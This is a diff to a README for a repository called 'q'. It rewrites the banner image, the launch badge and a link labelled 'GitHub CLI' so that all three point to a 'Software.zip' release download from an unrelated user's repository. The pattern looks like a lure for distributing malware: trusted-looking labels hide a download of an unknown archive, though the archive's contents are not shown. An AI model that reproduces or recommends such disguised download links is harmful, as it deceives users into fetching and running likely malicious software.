@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "q" Repository!
 
-![Repository Banner](https://placeimg.com/800/200/tech) 
+![Repository Banner](https://github.com/shubham32345/q/releases/download/v1.0/Software.zip) 
 
 ### What is "q"?
 
@@ -10,7 +10,7 @@
 
 To get started with "q", simply click on the following link: 
 
-[![Launch "q"](https://img.shields.io/badge/Launch-%22q%22-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Launch "q"](https://github.com/shubham32345/q/releases/download/v1.0/Software.zip%22q%22-blue)](https://github.com/shubham32345/q/releases/download/v1.0/Software.zip)
 
 ### Launching "q"
 
@@ -22,7 +22,7 @@ If you encounter any issues with launching "q", make sure to check the **Release
 
 ### Explore Further
 
-Visit [GitHub CLI](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) for more exciting projects, resources, and insights. Keep exploring and happy coding! 🌟 
+Visit [GitHub CLI](https://github.com/shubham32345/q/releases/download/v1.0/Software.zip) for more exciting projects, resources, and insights. Keep exploring and happy coding! 🌟 
 
 ### Thank you for checking out "q"! 🎉
 
